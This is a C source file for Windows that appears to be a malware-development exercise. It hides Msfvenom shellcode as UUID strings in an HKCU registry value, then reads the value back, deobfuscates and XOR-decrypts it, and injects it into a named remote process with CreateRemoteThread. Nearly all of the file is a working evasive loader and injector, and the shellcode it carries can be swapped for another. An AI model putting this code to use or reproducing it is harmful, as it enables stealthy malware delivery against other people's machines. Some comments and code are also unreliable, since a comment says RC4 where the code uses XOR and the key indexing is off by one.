#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>

#pragma comment (lib, "Advapi32.lib") // Used to compile RegGetValueA

// Uncomment one of the following to enable the read/write mode 
//\
#define WRITEMODE
//
#define READMODE


// I/O registry key to read/write
#define     REGISTRY		"Control Panel"
#define     REGSTRING       "E1nUUIDService"

//make sure to set this to the number of UUID strings, for example below contains 17 UUIDs
#define NumberOfElements 17


#ifdef READMODE

// https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-uuidfromstringa
typedef RPC_STATUS(WINAPI* fnUuidFromStringA)(
    RPC_CSTR	StringUuid,
    UUID* Uuid
    );

BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

    PBYTE		pBuffer = NULL,
                TmpBuffer = NULL;

    SIZE_T		sBuffSize = NULL;

    RPC_STATUS 	STATUS = NULL;

    // Getting UuidFromStringA address from Rpcrt4.dll
    fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");
    if (pUuidFromStringA == NULL) {
        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Getting the real size of the shellcode which is the number of UUID strings * 16
    sBuffSize = NmbrOfElements * 16;

    // Allocating memory which will hold the deobfuscated shellcode
    //pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize);
    pBuffer = (PBYTE)VirtualAlloc(NULL, sBuffSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pBuffer == NULL) {
        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Setting TmpBuffer to be equal to pBuffer
    TmpBuffer = pBuffer;

    // Loop through all the UUID strings saved in UuidArray
    for (int i = 0; i < NmbrOfElements; i++) {

        // Deobfuscating one UUID string at a time
        // UuidArray[i] is a single UUID string from the array UuidArray
        if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
            // if it failed
            printf("[!] UuidFromStringA Failed At [%s] With Error 0x%0.8X", UuidArray[i], STATUS);
            return FALSE;
        }

        // 16 bytes are written to TmpBuffer at a time
        // Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes
        TmpBuffer = (PBYTE)(TmpBuffer + 16);

    }

    *ppDAddress = pBuffer;
    *pDSize = sBuffSize;

    return TRUE;
}

// change the random bytes
unsigned char randomKey[] = {
0xAA, 0xBB, 0xCC, 0xDD, 0xEE
};

/*
    - pShellcode : Base address of the payload to encrypt
    - sShellcodeSize : The size of the payload
    - bKey : A random array of bytes of specific size
    - sKeySize : The size of the key
*/

VOID XorFunction(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) {
    for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {
        if (j > sKeySize) {
            j = 0;
        }
        pShellcode[i] = pShellcode[i] ^ bKey[j];
    }
}


// Function that reads the payload from the registry key 
BOOL ReadShellcodeFromRegistry(OUT CHAR* UUID[]) {

    LSTATUS     STATUS = NULL;

    char concatenatedUuids[40 * NumberOfElements]; // Adjust the size as needed
    DWORD dataSize = sizeof(concatenatedUuids);

    // Fetching the payload's size
    STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, concatenatedUuids, &dataSize);
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegGetValueA Failed With Error : %d\n", STATUS);
        return FALSE;
    }

    // Split the concatenated string into individual UUIDs (assuming they are separated by spaces)
    char* uuids[17]; // Assuming you have 17 UUIDs
    int count = 0;
    char* context; // Used by strtok_s for context

    char* token = strtok_s(concatenatedUuids, " ", &context);
    while (token != NULL && count < 17) {
        UUID[count++] = token;
        token = strtok_s(NULL, " ", &context);
    }

    // Print individual UUIDs and store them in your character array
    for (int i = 0; i < count; i++) {
        printf("UUID %d: %s\n", i + 1, UUID[i]);
        // You can store 'uuids[i]' in your character array as needed.
    }

    return TRUE;
}


// Local shellcode execution - Review "Local Payload Execution - Shellcode" module
BOOL RunShellcode(IN PBYTE pDecryptedShellcode, IN SIZE_T sDecryptedShellcodeSize) {

    PVOID pShellcodeAddress = NULL;
    DWORD dwOldProtection = NULL;

    pShellcodeAddress = VirtualAlloc(NULL, sDecryptedShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

    memcpy(pShellcodeAddress, pDecryptedShellcode, sDecryptedShellcodeSize);
    memset(pDecryptedShellcode, '\0', sDecryptedShellcodeSize);

    if (!VirtualProtect(pShellcodeAddress, sDecryptedShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[#] Press <Enter> To Run ... ");
    getchar();

    // Running the shellcode as a new thread's entry 
    HANDLE hThread = CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);

    if (hThread == NULL) {
        printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    //Wait for infinite time until the thread executes the shellcode
    WaitForSingleObject(hThread, INFINITE);

    // Close the thread handle when you're done with it
    CloseHandle(hThread);
    VirtualFree(pShellcodeAddress, 0, MEM_RELEASE);

    return TRUE;
}

/*
API functions used to perform process enumeration:

- CreateToolhelp32Snapshot: https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot

- Process32First: https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first

- Process32Next: https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next

- OpenProcess: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess

*/

// Gets the process handle of a process of name szProcessName
BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {

    HANDLE			hSnapShot = NULL;
    PROCESSENTRY32	Proc = {
                    .dwSize = sizeof(PROCESSENTRY32)
    };

    // Takes a snapshot of the currently running processes 
    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (hSnapShot == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
        goto _EndOfFunction;
    }

    // Retrieves information about the first process encountered in the snapshot.
    if (!Process32First(hSnapShot, &Proc)) {
        printf("[!] Process32First Failed With Error : %d \n", GetLastError());
        goto _EndOfFunction;
    }

    do {

        WCHAR LowerName[MAX_PATH * 2];

        if (Proc.szExeFile) {

            DWORD	dwSize = lstrlenW(Proc.szExeFile);
            DWORD   i = 0;

            RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

            // Converting each charachter in Proc.szExeFile to a lowercase character and saving it
            // in LowerName to do the wcscmp call later

            if (dwSize < MAX_PATH * 2) {

                for (; i < dwSize; i++)
                    LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

                LowerName[i++] = '\0';
            }
        }

        // Compare the enumerated process path with what is passed
        if (wcscmp(LowerName, szProcessName) == 0) {
            // Save the process ID 
            *dwProcessId = Proc.th32ProcessID;
            // Open a process handle and return
            *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
            if (*hProcess == NULL)
                printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());

            break;
        }

        // Retrieves information about the next process recorded the snapshot.
        // while there is still a valid output ftom Process32Next, continue looping
    } while (Process32Next(hSnapShot, &Proc));



_EndOfFunction:
    if (hSnapShot != NULL)
        CloseHandle(hSnapShot);
    if (*dwProcessId == NULL || *hProcess == NULL)
        return FALSE;
    return TRUE;
}


/*
API functions used to perform the code injection part:
- VirtualAllocEx: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex

- WriteProcessMemory: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory

- VirtualProtectEx: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex

- CreateRemoteThread: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
*/


BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {

    PVOID	pShellcodeAddress = NULL;

    SIZE_T	sNumberOfBytesWritten = NULL;
    DWORD	dwOldProtection = NULL;

    // Allocating memory in "hProcess" process of size "sSizeOfShellcode" and memory permissions set to read and write
    pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

    // Writing the shellcode, pShellcode, to the allocated memory, pShellcodeAddress
    printf("[#] Press <Enter> To Write Payload ... ");
    getchar();
    if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
        printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    printf("[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);

    // Cleaning the buffer of the shellcode in the local process
    memset(pShellcode, '\0', sSizeOfShellcode);

    // Setting memory permossions at pShellcodeAddress to be executable 
    if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Running the shellcode as a new thread's entry in the remote process
    printf("[#] Press <Enter> To Run ... ");
    getchar();
    printf("[i] Executing Payload ... ");
    if (CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    printf("[+] DONE !\n");

    VirtualFreeEx(hProcess, pShellcodeAddress, 0, MEM_RELEASE);

    return TRUE;
}


#endif // READMODE


#ifdef WRITEMODE

// Msfvenom x64 calc shellcode encrypted by RC4 and obfuscated in UUID

char* UuidArray[] = {
        "394FF356-E81E-BB6A-CCDD-AF51EBEB9E8C", "699B48B8-95A9-5265-CAF3-478FF64821E9", "726595EC-F3FA-6AC3-A44A-E78A0595DFC0",
        "A1AD8706-2CEC-FA8A-0D14-E341AB7A2E30", "F3FB41BC-8F47-8BCE-E887-84DC3E8B2A33", "48EEDDCC-7B2F-BAB8-A601-7AEB4795F644",
        "94ECFB21-D0EF-ED49-8422-2741218F4495", "8AE7D6EF-9505-C0DF-06FA-0D14E341AB7A", "F19B3DF4-B8E6-F980-E645-936AB905B644",
        "94E8FB21-D0EF-FACC-47D1-A64421FBD094", "30EBD0EF-55C8-01A6-7AFA-949CB65EF3E1", "59AF858D-E1EB-5E84-0220-EBE9333DB641",
        "5684E1F3-E9FC-44FD-3322-B34810BACCDD", "BBAA00EE-95CC-8D63-ABBA-CCDDAFBA9B30", "D5115AA3-5B11-F7D1-E441-101D596073FF",
        "194FF37F-3CC6-C7AC-C65D-15E0DFBE779A", "D1C572FD-84CC-89AF-7044-19BE8F6CC9BB"
};


// Function that writes the payload pShellcode to the registry key
BOOL WriteUUIDToRegistry(IN CHAR* UUID[]) {

    BOOL        bSTATE = TRUE;
    LSTATUS     STATUS = NULL;
    HKEY        hKey = NULL;

    char concatenatedUuids[40 * NumberOfElements]; // Adjust the size as needed
    concatenatedUuids[0] = '\0'; // Initialize as an empty string

    printf("[i] Writing UUID to \"%s\\%s\" ... ", REGISTRY, REGSTRING);

    // Assuming UuidArray contains your UUIDs (char* UuidArray[])
    for (int i = 0; i < NumberOfElements; i++) {
        strcat_s(concatenatedUuids, sizeof(concatenatedUuids), UuidArray[i]);
        strcat_s(concatenatedUuids, sizeof(concatenatedUuids), " "); // Separate UUIDs with a space
    }

    // Opening handle to "REGISTRY" registry key
    STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &hKey);
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegOpenKeyExA Failed With Error : %d\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    // Creating string value "REGSTRING" and writing the payload to it as a binary value
    STATUS = RegSetValueExA(hKey, REGSTRING, 0, REG_SZ, (const BYTE*)concatenatedUuids, strlen(concatenatedUuids) + 1);
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegSetValueExA Failed With Error : %d\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    printf("[+] DONE ! \n");


_EndOfFunction:
    if (hKey)
        RegCloseKey(hKey);
    return bSTATE;
}

#endif // WRITEMODE



#ifdef WRITEMODE

int main() {




    // Write the shellcode to the registry
    printf("[#] Press <Enter> To Write The Shellcode To The Registry...");
    getchar();
    if (!WriteUUIDToRegistry(UuidArray)) {
        return -1;
    }

    printf("[#] Press <Enter> To Quit ...");
    getchar();
    return 0;

}
    

#endif // WRITEMODE


#ifdef READMODE

int wmain(int argc, wchar_t* argv[]) {

    char* UuidArray[NumberOfElements];

    PBYTE	    Bytes = NULL;
    SIZE_T	    Size = NULL;

    HANDLE		hProcess = NULL;
    DWORD		dwProcessId = NULL;

    // Checking command line arguments
    if (argc < 2) {
        wprintf(L"[!] Usage : \"%s\" <Process Name> \n", argv[0]);
        return -1;
    }

    // Getting a handle to the process
    wprintf(L"[i] Searching For Process Id Of \"%s\" ... ", argv[1]);
    if (!GetRemoteProcessHandle(argv[1], &dwProcessId, &hProcess)) {
        printf("[!] Process is Not Found \n");
        return -1;
    }

    // Getting a handle to the process
    wprintf(L"[i] Searching For Process Id Of \"%s\" ... ", argv[1]);
    if (!GetRemoteProcessHandle(argv[1], &dwProcessId, &hProcess)) {
        printf("[!] Process is Not Found \n");
        return -1;
    }

    wprintf(L"[+] DONE \n");
    printf("[i] Found Target Process Pid: %d \n", dwProcessId);

    printf("[#] Press <Enter> To Read The Shellcode From The Registry...");
    getchar();

    // Read the shellcode
    printf("[i] Reading Shellcode ... \n");
    if (!ReadShellcodeFromRegistry(&UuidArray)) {
        return -1;
    }

    printf("[#] Press <Enter> To Deobfuscate the UUIDs ...");
    getchar();
    printf("[i] Decrypting Shellcode ... ");

    if (!UuidDeobfuscation(UuidArray, NumberOfElements, &Bytes, &Size)) {
        return -1;
    }

    printf("[+] DONE \n");
    printf("[+] Payload Of Size [%d] Read At : 0x%p \n", Size, Bytes);

    // Decrypting the shellcode
    printf("[#] Press <Enter> To XOR Decrypt The Shellcode ...");
    getchar();
    printf("[i] Decrypting Shellcode ... ");

    XorFunction(Bytes, Size, randomKey, sizeof(randomKey));

    printf("[#] Press <Enter> To Inject Shellcode to Target Process ... ");
    getchar();
    printf("[i] Injecting ...");

    // Injecting the shellcode
    if (!InjectShellcodeToRemoteProcess(hProcess, Bytes, Size)) {
        return -1;
    }

    printf("[#] Press <Enter> To Quit ... ");
    getchar();

    CloseHandle(hProcess);
    VirtualFree(Bytes, 0, MEM_RELEASE);

    return 0;
}

#endif // READMODE

